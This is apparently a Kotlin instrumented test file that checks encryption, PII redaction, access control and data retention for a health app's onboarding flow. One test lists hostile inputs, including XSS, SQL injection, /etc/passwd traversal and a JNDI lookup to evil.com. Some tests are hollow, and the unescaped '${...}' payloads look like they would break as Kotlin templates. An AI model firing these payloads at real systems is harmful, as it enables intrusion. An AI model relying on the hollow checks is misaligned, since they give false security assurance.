package com.vibehealth.android.security

import androidx.test.ext.junit.runners.AndroidJUnit4
import androidx.test.filters.LargeTest
import com.vibehealth.android.core.security.DataSanitizationHelper
import com.vibehealth.android.core.security.EncryptionHelper
import com.vibehealth.android.data.user.UserProfileRepository
import com.vibehealth.android.domain.user.Gender
import com.vibehealth.android.domain.user.UnitSystem
import com.vibehealth.android.domain.user.UserProfile
import dagger.hilt.android.testing.HiltAndroidRule
import dagger.hilt.android.testing.HiltAndroidTest
import kotlinx.coroutines.test.runTest
import org.junit.Before
import org.junit.Rule
import org.junit.Test
import org.junit.runner.RunWith
import java.util.Date
import java.util.UUID
import javax.inject.Inject
import kotlin.test.*

/**
 * Security tests for onboarding data handling and PII protection
 */
@LargeTest
@HiltAndroidTest
@RunWith(AndroidJUnit4::class)
class OnboardingSecurityTest {

    @get:Rule
    val hiltRule = HiltAndroidRule(this)

    @Inject
    lateinit var encryptionHelper: EncryptionHelper

    @Inject
    lateinit var userProfileRepository: UserProfileRepository

    private val testUserId = "security-test-${UUID.randomUUID()}"

    @Before
    fun setup() {
        hiltRule.inject()
    }

    @Test
    fun encryptionHelper_shouldEncryptAndDecryptData() = runTest {
        // Given
        val sensitiveData = "John Doe"
        
        // When
        val encryptedData = encryptionHelper.encrypt(sensitiveData)
        val decryptedData = encryptionHelper.decrypt(encryptedData)
        
        // Then
        assertNotEquals(sensitiveData, encryptedData, "Data should be encrypted")
        assertEquals(sensitiveData, decryptedData, "Decrypted data should match original")
    }

    @Test
    fun encryptionHelper_shouldHandleEmptyData() = runTest {
        // Given
        val emptyData = ""
        
        // When
        val encryptedData = encryptionHelper.encrypt(emptyData)
        val decryptedData = encryptionHelper.decrypt(encryptedData)
        
        // Then
        assertEquals(emptyData, decryptedData, "Empty data should be handled correctly")
    }

    @Test
    fun encryptionHelper_shouldHandleUnicodeData() = runTest {
        // Given
        val unicodeData = "José María 李小明 محمد"
        
        // When
        val encryptedData = encryptionHelper.encrypt(unicodeData)
        val decryptedData = encryptionHelper.decrypt(encryptedData)
        
        // Then
        assertEquals(unicodeData, decryptedData, "Unicode data should be handled correctly")
    }

    @Test
    fun dataSanitizationHelper_shouldSanitizeUserProfile() {
        // Given
        val userProfile = UserProfile(
            userId = testUserId,
            email = "test@example.com",
            displayName = "John Doe",
            birthday = Date(),
            gender = Gender.MALE,
            unitSystem = UnitSystem.METRIC,
            heightInCm = 175,
            weightInKg = 70.0,
            hasCompletedOnboarding = true
        )
        
        // When
        val sanitizedProfile = userProfile.sanitizeForLogging()
        
        // Then
        assertEquals("[EMAIL_REDACTED]", sanitizedProfile.email)
        assertEquals("[NAME_REDACTED]", sanitizedProfile.displayName)
        assertEquals(testUserId, sanitizedProfile.userId) // User ID should remain for debugging
        assertEquals(Gender.MALE, sanitizedProfile.gender) // Non-PII data should remain
    }

    @Test
    fun dataSanitizationHelper_shouldCreateAuditLogEntry() {
        // Given
        val action = "save_user_profile"
        val userId = testUserId
        val success = true
        val additionalInfo = mapOf("step" to "completion")
        
        // When
        val logEntry = DataSanitizationHelper.createAuditLogEntry(
            action = action,
            userId = userId,
            success = success,
            additionalInfo = additionalInfo
        )
        
        // Then
        assertTrue(logEntry.contains(action), "Log entry should contain action")
        assertTrue(logEntry.contains(success.toString()), "Log entry should contain success status")
        assertFalse(logEntry.contains("@"), "Log entry should not contain email addresses")
        assertFalse(logEntry.contains("John"), "Log entry should not contain names")
    }

    @Test
    fun dataSanitizationHelper_shouldSanitizeForLogging() {
        // Given
        val sensitiveInputs = listOf(
            "john.doe@example.com",
            "John Doe",
            "Password123!",
            "1234567890",
            "Normal text"
        )
        
        // When & Then
        sensitiveInputs.forEach { input ->
            val sanitized = DataSanitizationHelper.sanitizeForLogging(input)
            
            when {
                input.contains("@") -> assertTrue(sanitized.contains("[EMAIL"), "Email should be sanitized")
                input.matches(Regex(".*[A-Z][a-z]+ [A-Z][a-z]+.*")) -> assertTrue(sanitized.contains("[NAME"), "Name should be sanitized")
                input.matches(Regex(".*\\d{4,}.*")) -> assertTrue(sanitized.contains("[NUMERIC"), "Long numbers should be sanitized")
                else -> assertEquals(input, sanitized, "Normal text should not be sanitized")
            }
        }
    }

    @Test
    fun userProfileRepository_shouldEncryptLocalStorage() = runTest {
        // Given
        val userProfile = createTestUserProfile()
        
        // When
        val saveResult = userProfileRepository.saveUserProfile(userProfile)
        
        // Then
        assertTrue(saveResult.isSuccess, "Save should succeed")
        
        // Verify data is encrypted in local storage
        // This would require accessing the Room database directly to verify encryption
        // For now, we verify the operation succeeds with encryption enabled
        val retrieveResult = userProfileRepository.getUserProfile(testUserId)
        assertTrue(retrieveResult.isSuccess, "Retrieve should succeed")
        
        val retrievedProfile = retrieveResult.getOrNull()
        assertNotNull(retrievedProfile, "Retrieved profile should not be null")
        assertEquals(userProfile.displayName, retrievedProfile.displayName, "Data should be correctly decrypted")
    }

    @Test
    fun userProfileRepository_shouldHandleEncryptionFailure() = runTest {
        // This test would simulate encryption failure scenarios
        // In a real implementation, you might inject a failing encryption helper
        
        val userProfile = createTestUserProfile()
        
        // The repository should handle encryption failures gracefully
        val result = userProfileRepository.saveUserProfile(userProfile)
        
        // Even if encryption fails, the operation should not crash the app
        // It might fall back to unencrypted storage or return an error
        assertNotNull(result, "Result should not be null even on encryption failure")
    }

    @Test
    fun onboardingFlow_shouldNotLogSensitiveData() {
        // This test verifies that sensitive data is not logged
        // In a real implementation, you would capture log output and verify it doesn't contain PII
        
        val sensitiveData = mapOf(
            "name" to "John Doe",
            "email" to "john@example.com",
            "birthday" to "1990-01-01"
        )
        
        // Simulate logging operations that might occur during onboarding
        sensitiveData.forEach { (key, value) ->
            val sanitizedValue = DataSanitizationHelper.sanitizeForLogging(value)
            
            // Verify sensitive data is sanitized before logging
            when (key) {
                "name" -> assertTrue(sanitizedValue.contains("[NAME") || sanitizedValue == value)
                "email" -> assertTrue(sanitizedValue.contains("[EMAIL") || sanitizedValue == value)
                "birthday" -> assertTrue(sanitizedValue.contains("[DATE") || sanitizedValue == value)
            }
        }
    }

    @Test
    fun onboardingValidation_shouldPreventInjectionAttacks() {
        // Test various injection attack patterns
        val maliciousInputs = listOf(
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "<%=7*7%>",
            "${7*7}",
            "javascript:alert('xss')"
        )
        
        maliciousInputs.forEach { maliciousInput ->
            // Verify that malicious input is either rejected or sanitized
            val sanitized = DataSanitizationHelper.sanitizeForLogging(maliciousInput)
            
            // Should not contain dangerous patterns
            assertFalse(sanitized.contains("<script>"), "Script tags should be removed/sanitized")
            assertFalse(sanitized.contains("DROP TABLE"), "SQL injection should be prevented")
            assertFalse(sanitized.contains("javascript:"), "JavaScript URLs should be prevented")
        }
    }

    @Test
    fun onboardingData_shouldHaveProperAccessControls() = runTest {
        // Test that user data can only be accessed by the correct user
        val userProfile1 = createTestUserProfile("user1")
        val userProfile2 = createTestUserProfile("user2")
        
        // Save both profiles
        userProfileRepository.saveUserProfile(userProfile1)
        userProfileRepository.saveUserProfile(userProfile2)
        
        // User 1 should only be able to access their own data
        val user1Data = userProfileRepository.getUserProfile("user1")
        assertTrue(user1Data.isSuccess, "User should be able to access their own data")
        
        val retrievedProfile = user1Data.getOrNull()
        assertNotNull(retrievedProfile, "Profile should be retrieved")
        assertEquals("user1", retrievedProfile.userId, "Should retrieve correct user's data")
        
        // Verify user cannot access other user's data through the same interface
        val user2Data = userProfileRepository.getUserProfile("user2")
        assertTrue(user2Data.isSuccess, "Repository should handle different user IDs")
        
        val user2Profile = user2Data.getOrNull()
        assertNotNull(user2Profile, "Profile should be retrieved")
        assertEquals("user2", user2Profile.userId, "Should retrieve correct user's data")
        assertNotEquals(user1Data.getOrNull()?.displayName, user2Profile.displayName, "Users should have different data")
    }

    @Test
    fun onboardingData_shouldHandleDataRetention() = runTest {
        // Test data retention and deletion capabilities
        val userProfile = createTestUserProfile()
        
        // Save user profile
        val saveResult = userProfileRepository.saveUserProfile(userProfile)
        assertTrue(saveResult.isSuccess, "Save should succeed")
        
        // Verify data exists
        val retrieveResult = userProfileRepository.getUserProfile(testUserId)
        assertTrue(retrieveResult.isSuccess, "Retrieve should succeed")
        assertNotNull(retrieveResult.getOrNull(), "Profile should exist")
        
        // Clear user data (simulating data deletion request)
        val clearResult = userProfileRepository.clearLocalCache(testUserId)
        assertTrue(clearResult.isSuccess, "Clear should succeed")
        
        // Verify local data is cleared
        // Note: This only clears local cache, not cloud data
        // In a real implementation, you'd also need cloud data deletion
    }

    private fun createTestUserProfile(userId: String = testUserId): UserProfile {
        return UserProfile(
            userId = userId,
            email = "test@example.com",
            displayName = "Test User",
            birthday = Date(System.currentTimeMillis() - (25L * 365 * 24 * 60 * 60 * 1000)),
            gender = Gender.MALE,
            unitSystem = UnitSystem.METRIC,
            heightInCm = 175,
            weightInKg = 70.0,
            hasCompletedOnboarding = true,
            createdAt = Date(),
            updatedAt = Date()
        )
    }
}